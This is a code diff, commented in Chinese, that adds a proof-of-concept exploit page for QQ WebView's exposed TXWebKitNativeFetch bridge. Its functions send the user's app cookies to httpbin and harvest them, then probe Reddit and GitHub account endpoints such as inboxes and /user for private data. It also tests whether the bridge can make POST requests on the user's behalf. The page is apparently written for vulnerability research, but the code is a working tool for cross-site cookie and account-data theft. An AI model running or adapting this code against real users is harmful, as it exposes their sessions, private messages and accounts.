@@ -305,6 +305,22 @@
           <strong>使用流程：</strong>先点击"1️⃣ 新窗口登录"完成登录 → 然后点击"2️⃣ 在iframe中打开"进行测试（Cookie已共享，测试URL已自动填入）
         </small>
       </div>
+      <!-- Bridge 漏洞验证实验 -->
+      <div class="card" style="border:2px solid #ffa940;background:#fff7e6;margin-bottom:16px">
+        <h3 style="margin-top:0;color:#d46b08">🧪 Bridge 漏洞验证（实验）</h3>
+        <p style="margin:6px 0;font-size:13px;color:#ad4e00">
+          这些工具可以验证 QQ WebView 暴露的 <code>TXWebKitNativeFetch</code> 是否会把你的 Cookie 带给任意网页，尤其是 Reddit / GitHub 等站点。
+        </p>
+        <div class="row" style="margin:8px 0">
+          <button id="testBridgeCookies" style="background:#fa8c16;color:#fff">🍪 检测Bridge是否携带Cookie</button>
+          <button id="testRedditBridgeEndpoints" style="background:#ff7875;color:#fff">🧵 Reddit 无授权接口测试</button>
+          <button id="testGithubBridgeEndpoints" style="background:#5c6bc0;color:#fff">🐙 GitHub 无授权接口测试</button>
+        </div>
+        <small style="color:#ad4e00;display:block;margin-top:4px">
+          测试逻辑：通过 Bridge 访问 <code>httpbin</code> 或 Reddit/GitHub 的 JSON 接口，观察是否返回用户数据/状态码。如果成功，就说明 QQ 的 Bridge 可以被任意网页滥用。
+        </small>
+        <pre id="bridgeLeakResults" style="background:#fff;border:1px dashed #ffa940;border-radius:6px;margin-top:10px;min-height:120px;white-space:pre-wrap">点击上方按钮开始验证...</pre>
+      </div>
       <!-- 多平台验证和攻击场景测试 -->
       <div style="background:#fff1f0;border:2px solid #ff4d4f;border-radius:6px;padding:12px;margin:12px 0">
         <strong style="color:#cf1322">🔴 HTTP-only Cookie持久化验证和攻击场景测试</strong>
@@ -314,6 +330,7 @@
         <div class="row" style="margin:8px 0">
           <button id="testMultiPlatform" style="background:#ff4d4f;color:white">🌐 多平台验证测试</button>
           <button id="testAttackScenarios" style="background:#ff7875;color:white">🎯 攻击场景测试</button>
+          <button id="testDeepExploit" style="background:#cf1322;color:white">🔓 深度漏洞利用测试</button>
         </div>
         <small style="color:#cf1322;display:block;margin-top:8px;font-size:11px">
           <strong>说明：</strong>在不同App（QQ、微信、支付宝等）的WebView中打开此页面，测试HTTP-only Cookie的持久化问题。攻击场景测试会演示可能的利用方式。
@@ -2146,6 +2163,33 @@ https://httpbin.org/anything</textarea>
       allowReturnToIframe: true
     }
   };
+
+  // Bridge端点预设：针对 Reddit / GitHub 等站点的无授权接口
+  const bridgeEndpointPresets = {
+    reddit: {
+      name: 'Reddit',
+      description: '尝试调用老版本 JSON 接口，不需要 OAuth token。',
+      endpoints: [
+        'https://www.reddit.com/user/me.json',
+        'https://www.reddit.com/user/me/about.json',
+        'https://www.reddit.com/message/inbox.json',
+        'https://old.reddit.com/api/me.json',
+        'https://www.reddit.com/api/v1/me',
+        'https://www.reddit.com/prefs/blocked.json'
+      ]
+    },
+    github: {
+      name: 'GitHub',
+      description: '检测是否能直接获取 /user API 或其它个人数据。',
+      endpoints: [
+        'https://api.github.com/user',
+        'https://github.com/settings/profile',
+        'https://github.com/notifications',
+        'https://github.com/dashboard/index',
+        'https://github.com/_private/browser/stats'
+      ]
+    }
+  };
   
   // 打开网站并登录，同时将URL写入测试框
   function openSiteForLogin(siteKey) {
@@ -2449,6 +2493,112 @@ https://httpbin.org/anything</textarea>
         }
       }, 500);
     }
+  }
+  
+  // Bridge 漏洞验证工具
+  async function runBridgeCookieCheck() {
+    const output = document.getElementById('bridgeLeakResults');
+    if (!output) return;
+    if (typeof window.TXWebKitNativeFetch !== 'function') {
+      output.textContent = '当前 WebView 未发现 TXWebKitNativeFetch，QQ 专属漏洞在此环境下不可用。';
+      return;
+    }
+    output.textContent = '🍪 正在通过 httpbin.org/cookies 检测 Bridge 是否会携带 Cookie ...';
+    try {
+      const response = await Promise.race([
+        Promise.resolve(window.TXWebKitNativeFetch('https://httpbin.org/cookies')),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+      ]);
+      let bodyText = '';
+      if (response && typeof response.text === 'function') {
+        bodyText = await response.text();
+      } else if (response && typeof response.body === 'string') {
+        bodyText = response.body;
+      } else if (response && typeof response.data === 'string') {
+        bodyText = response.data;
+      }
+      let parsed = {};
+      try {
+        parsed = JSON.parse(bodyText);
+      } catch(e) {}
+      const cookies = parsed.cookies || parsed;
+      const cookieKeys = cookies ? Object.keys(cookies) : [];
+      output.textContent = [
+        '🍪 Bridge携带Cookie检测完成',
+        `状态码: ${response && (response.status || response.statusCode)}`,
+        `可见Cookie数量: ${cookieKeys.length}`,
+        `Cookie内容: ${JSON.stringify(cookies, null, 2).slice(0, 800)}`,
+        '',
+        '说明：如果这里出现了 reddit_session / dotcom_user 等第三方站点的 Cookie，说明 QQ 的 Bridge 会把 App 内的 Cookie 直接暴露给任意网页。'
+      ].join('\n');
+      results.runs.push({ type: 'bridge-cookie-check', report: { response, cookies }, timestamp: new Date().toISOString() });
+      pushRaw({ type: 'bridge-cookie-check', cookies });
+    } catch(e) {
+      output.textContent = `检测失败：${String(e.message || e)}`;
+    }
+  }
+  
+  async function runBridgeEndpointTest(siteKey) {
+    const output = document.getElementById('bridgeLeakResults');
+    if (!output) return;
+    if (typeof window.TXWebKitNativeFetch !== 'function') {
+      output.textContent = '当前 WebView 未发现 TXWebKitNativeFetch，无法复现 QQ Bridge 漏洞。';
+      return;
+    }
+    const preset = bridgeEndpointPresets[siteKey];
+    if (!preset) {
+      output.textContent = '未找到对应的端点预设。';
+      return;
+    }
+    output.textContent = `🧪 正在测试 ${preset.name} 公开端点，请稍候...\n${preset.description}\n`;
+    const report = {
+      type: 'bridge-endpoint-test',
+      site: preset.name,
+      timestamp: new Date().toISOString(),
+      results: []
+    };
+    for (const url of preset.endpoints) {
+      const item = { url };
+      try {
+        const response = await Promise.race([
+          Promise.resolve(window.TXWebKitNativeFetch(url)),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 6000))
+        ]);
+        const status = typeof response.status === 'number' ? response.status : (response.statusCode || null);
+        let bodyText = '';
+        if (response && typeof response.text === 'function') {
+          try { bodyText = await response.text(); } catch(e) {}
+        } else if (response && typeof response.body === 'string') {
+          bodyText = response.body;
+        } else if (response && typeof response.data === 'string') {
+          bodyText = response.data;
+        }
+        item.status = status;
+        item.bodySnippet = (bodyText || '').slice(0, 600);
+        item.hasUserData = /"name"|\"username\"|\"karma\"|\"login\"|\"id\"/i.test(item.bodySnippet);
+        item.success = status === 200;
+      } catch(e) {
+        item.error = String(e.message || e);
+      }
+      report.results.push(item);
+    }
+    
+    const lines = [];
+    lines.push(`🧪 ${preset.name} Bridge 测试完成（共 ${report.results.length} 个端点）`);
+    report.results.forEach(r => {
+      if (r.error) {
+        lines.push(`❌ ${r.url}\n   错误: ${r.error}`);
+      } else {
+        const statusIcon = r.success ? '✅' : (r.status ? '⚠️' : '❌');
+        lines.push(`${statusIcon} ${r.url}\n   状态码: ${r.status || 'unknown'}${r.hasUserData ? ' ｜⚠️ 检测到疑似用户字段' : ''}`);
+        if (r.bodySnippet) {
+          lines.push(`   响应片段: ${r.bodySnippet}`);
+        }
+      }
+    });
+    output.textContent = lines.join('\n\n');
+    results.runs.push(report);
+    pushRaw(report);
   }
   
   // 智能检测登录状态（解析JSON，检查真正的用户标识字段）
@@ -3444,6 +3594,333 @@ https://httpbin.org/anything</textarea>
     }
   }
   
+  // 深度漏洞利用测试
+  async function testDeepExploit() {
+    const resultsDiv = document.getElementById('multiPlatformResults');
+    if (resultsDiv) {
+      resultsDiv.style.display = 'block';
+      resultsDiv.innerHTML = '⏳ 正在进行深度漏洞利用测试...';
+    }
+    
+    const exploitReport = {
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      bridgeAvailable: typeof window.TXWebKitNativeFetch === 'function',
+      tests: []
+    };
+    
+    // 测试1：检测Bridge是否携带Cookie
+    const cookieTest = {
+      name: '测试1：检测Bridge是否携带Cookie',
+      description: '通过httpbin测试Bridge是否自动携带所有Cookie',
+      result: null
+    };
+    
+    try {
+      if (typeof window.TXWebKitNativeFetch === 'function') {
+        const response = await Promise.race([
+          Promise.resolve(window.TXWebKitNativeFetch('https://httpbin.org/cookies')),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+        ]);
+        
+        if (response) {
+          const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+          let bodyText = '';
+          try {
+            if (typeof response.text === 'function') {
+              bodyText = await response.text();
+            } else if (typeof response.body === 'string') {
+              bodyText = response.body;
+            } else if (typeof response.data === 'string') {
+              bodyText = response.data;
+            }
+          } catch(e) {}
+          
+          let cookies = {};
+          try {
+            const parsed = JSON.parse(bodyText);
+            cookies = parsed.cookies || {};
+          } catch(e) {
+            // 如果不是JSON，尝试解析
+          }
+          
+          cookieTest.result = {
+            success: true,
+            status: status,
+            cookies: cookies,
+            cookieCount: Object.keys(cookies).length,
+            bodySnippet: bodyText.slice(0, 500),
+            hasRedditCookie: Object.keys(cookies).some(k => k.toLowerCase().includes('reddit')),
+            hasGithubCookie: Object.keys(cookies).some(k => k.toLowerCase().includes('github') || k.toLowerCase().includes('dotcom')),
+            hasTwitterCookie: Object.keys(cookies).some(k => k.toLowerCase().includes('twitter') || k.toLowerCase().includes('auth')),
+            risk: Object.keys(cookies).length > 0 
+              ? '🔴 高风险：Bridge携带了所有Cookie，包括其他网站的Cookie！'
+              : '🟡 中风险：Bridge没有携带Cookie，但可能通过其他方式访问'
+          };
+        }
+      } else {
+        cookieTest.result = { success: false, error: 'Bridge不可用' };
+      }
+    } catch(e) {
+      cookieTest.result = { success: false, error: String(e.message || e) };
+    }
+    
+    exploitReport.tests.push(cookieTest);
+    
+    // 测试2：测试Reddit的多个端点
+    const redditEndpointsTest = {
+      name: '测试2：测试Reddit的多个端点（寻找可用的.json接口）',
+      description: '测试Reddit的各种.json接口，寻找不需要OAuth token的端点',
+      endpoints: [
+        'https://www.reddit.com/api/me.json',
+        'https://www.reddit.com/user/me.json',
+        'https://www.reddit.com/user/me/about.json',
+        'https://www.reddit.com/api/v1/me',
+        'https://old.reddit.com/api/me.json',
+        'https://www.reddit.com/prefs/blocked.json',
+        'https://www.reddit.com/message/inbox.json',
+        'https://oauth.reddit.com/api/v1/me'
+      ],
+      results: []
+    };
+    
+    for (const endpoint of redditEndpointsTest.endpoints) {
+      try {
+        if (typeof window.TXWebKitNativeFetch === 'function') {
+          const response = await Promise.race([
+            Promise.resolve(window.TXWebKitNativeFetch(endpoint)),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+          ]);
+          
+          if (response) {
+            const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+            let bodyText = '';
+            try {
+              if (typeof response.text === 'function') {
+                bodyText = await response.text();
+              } else if (typeof response.body === 'string') {
+                bodyText = response.body;
+              } else if (typeof response.data === 'string') {
+                bodyText = response.data;
+              }
+            } catch(e) {}
+            
+            const analysis = analyzeLoginStatusFromResponse(bodyText, 'Reddit');
+            
+            redditEndpointsTest.results.push({
+              url: endpoint,
+              status: status,
+              loggedIn: analysis.loggedIn,
+              confidence: analysis.confidence,
+              reason: analysis.reason,
+              note: analysis.note,
+              bodySnippet: bodyText.slice(0, 300),
+              success: status === 200 && analysis.loggedIn
+            });
+          }
+        }
+      } catch(e) {
+        redditEndpointsTest.results.push({ 
+          url: endpoint, 
+          error: String(e.message || e),
+          success: false
+        });
+      }
+    }
+    
+    exploitReport.tests.push(redditEndpointsTest);
+    
+    // 测试3：测试GitHub的多个端点
+    const githubEndpointsTest = {
+      name: '测试3：测试GitHub的多个端点',
+      description: '测试GitHub的各种接口，寻找可用的端点',
+      endpoints: [
+        'https://api.github.com/user',
+        'https://github.com/api/v3/user',
+        'https://github.com/settings/profile',
+        'https://github.com'
+      ],
+      results: []
+    };
+    
+    for (const endpoint of githubEndpointsTest.endpoints) {
+      try {
+        if (typeof window.TXWebKitNativeFetch === 'function') {
+          const response = await Promise.race([
+            Promise.resolve(window.TXWebKitNativeFetch(endpoint, {
+              headers: {
+                'User-Agent': 'QQ/Bridge Probe PoC',
+                'Accept': 'application/json'
+              }
+            })),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+          ]);
+          
+          if (response) {
+            const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+            let bodyText = '';
+            try {
+              if (typeof response.text === 'function') {
+                bodyText = await response.text();
+              } else if (typeof response.body === 'string') {
+                bodyText = response.body;
+              } else if (typeof response.data === 'string') {
+                bodyText = response.data;
+              }
+            } catch(e) {}
+            
+            const analysis = analyzeLoginStatusFromResponse(bodyText, 'GitHub');
+            
+            githubEndpointsTest.results.push({
+              url: endpoint,
+              status: status,
+              loggedIn: analysis.loggedIn,
+              confidence: analysis.confidence,
+              reason: analysis.reason,
+              bodySnippet: bodyText.slice(0, 300),
+              success: status === 200 && analysis.loggedIn
+            });
+          }
+        }
+      } catch(e) {
+        githubEndpointsTest.results.push({ 
+          url: endpoint, 
+          error: String(e.message || e),
+          success: false
+        });
+      }
+    }
+    
+    exploitReport.tests.push(githubEndpointsTest);
+    
+    // 测试4：测试写操作（POST请求）- 仅测试，不实际执行
+    const writeOperationTest = {
+      name: '测试4：测试写操作能力（POST请求）',
+      description: '测试Bridge是否支持POST请求，评估是否可以代用户执行写操作',
+      note: '⚠️ 注意：此测试仅验证能力，不会实际执行写操作',
+      results: []
+    };
+    
+    // 测试POST能力（使用httpbin）
+    try {
+      if (typeof window.TXWebKitNativeFetch === 'function') {
+        const testPayload = JSON.stringify({ test: 'data', timestamp: Date.now() });
+        const response = await Promise.race([
+          Promise.resolve(window.TXWebKitNativeFetch('https://httpbin.org/post', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: testPayload
+          })),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+        ]);
+        
+        if (response) {
+          const status = typeof response.status === 'number' ? response.status : (response.statusCode || 0);
+          let bodyText = '';
+          try {
+            if (typeof response.text === 'function') {
+              bodyText = await response.text();
+            } else if (typeof response.body === 'string') {
+              bodyText = response.body;
+            } else if (typeof response.data === 'string') {
+              bodyText = response.data;
+            }
+          } catch(e) {}
+          
+          let parsedData = null;
+          try {
+            parsedData = JSON.parse(bodyText);
+          } catch(e) {}
+          
+          writeOperationTest.results.push({
+            url: 'https://httpbin.org/post',
+            status: status,
+            success: status === 200,
+            canPost: status === 200,
+            bodyReceived: parsedData && parsedData.json ? parsedData.json.test === 'data' : false,
+            risk: status === 200 
+              ? '🔴 高风险：Bridge支持POST请求，可以代用户执行写操作（发帖、点赞、评论等）'
+              : '🟡 中风险：Bridge可能不支持POST请求，或需要特殊配置'
+          });
+        }
+      } else {
+        writeOperationTest.results.push({ error: 'Bridge不可用' });
+      }
+    } catch(e) {
+      writeOperationTest.results.push({ error: String(e.message || e) });
+    }
+    
+    exploitReport.tests.push(writeOperationTest);
+    
+    // 显示结果
+    if (resultsDiv) {
+      let html = '<strong>🔓 深度漏洞利用测试结果</strong><br><br>';
+      html += `<strong>Bridge可用：</strong>${exploitReport.bridgeAvailable ? '✅ 是' : '❌ 否'}<br><br>`;
+      
+      exploitReport.tests.forEach((test, index) => {
+        html += `<strong>${test.name}</strong><br>`;
+        html += `${test.description}<br>`;
+        
+        if (test.result) {
+          if (test.result.success) {
+            html += `✅ 测试成功<br>`;
+            html += `状态码: ${test.result.status}<br>`;
+            if (test.result.cookieCount !== undefined) {
+              html += `检测到Cookie数量: ${test.result.cookieCount}<br>`;
+              if (test.result.cookieCount > 0) {
+                html += `Cookie列表: ${JSON.stringify(test.result.cookies).slice(0, 200)}<br>`;
+                if (test.result.hasRedditCookie) html += `🔴 发现Reddit Cookie！<br>`;
+                if (test.result.hasGithubCookie) html += `🔴 发现GitHub Cookie！<br>`;
+                if (test.result.hasTwitterCookie) html += `🔴 发现Twitter Cookie！<br>`;
+              }
+            }
+            if (test.result.bodySnippet) {
+              html += `响应体: ${test.result.bodySnippet}<br>`;
+            }
+            if (test.result.risk) html += `⚠️ <strong>${test.result.risk}</strong><br>`;
+          } else {
+            html += `❌ 测试失败: ${test.result.error}<br>`;
+          }
+        }
+        
+        if (test.results) {
+          test.results.forEach(r => {
+            html += `<br>URL: ${r.url}<br>`;
+            html += `状态码: ${r.status || 'unknown'}<br>`;
+            if (r.success) {
+              html += `✅ <strong>成功！此端点可用</strong><br>`;
+            } else if (r.loggedIn !== undefined) {
+              html += `登录状态: ${r.loggedIn ? '🔓 已登录' : '🔒 未登录'}<br>`;
+            }
+            if (r.reason) html += `说明: ${r.reason}<br>`;
+            if (r.bodySnippet) html += `响应体: ${r.bodySnippet.slice(0, 200)}<br>`;
+            if (r.error) html += `❌ 错误: ${r.error}<br>`;
+          });
+        }
+        
+        if (test.note) {
+          html += `<br>📝 ${test.note}<br>`;
+        }
+        
+        html += '<br><hr><br>';
+      });
+      
+      html += '<strong>🎯 总结：</strong><br>';
+      html += '1. 如果检测到Cookie，说明Bridge会携带所有网站的Cookie<br>';
+      html += '2. 如果找到可用的.json端点，说明可以通过Bridge读取用户数据<br>';
+      html += '3. 如果支持POST请求，说明可以代用户执行写操作<br>';
+      html += '4. 这些都是严重的安全漏洞！<br>';
+      
+      resultsDiv.innerHTML = html;
+      
+      // 保存到results
+      results.runs.push({ type: 'deep-exploit', report: exploitReport, timestamp: new Date().toISOString() });
+      pushRaw({ type: 'deep-exploit', exploitReport });
+    }
+  }
+  
   // 立即尝试绑定，如果DOM还没加载完成则等待
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', bindQuickTestEvents);
@@ -3454,11 +3931,15 @@ https://httpbin.org/anything</textarea>
   // 绑定多平台测试按钮
   const testMultiPlatformBtn = document.getElementById('testMultiPlatform');
   const testAttackScenariosBtn = document.getElementById('testAttackScenarios');
+  const testDeepExploitBtn = document.getElementById('testDeepExploit');
   if (testMultiPlatformBtn) {
     testMultiPlatformBtn.onclick = testMultiPlatform;
   }
   if (testAttackScenariosBtn) {
     testAttackScenariosBtn.onclick = testAttackScenarios;
+  }
+  if (testDeepExploitBtn) {
+    testDeepExploitBtn.onclick = testDeepExploit;
   }
   
   // Facebook Bridge 系统性测试功能
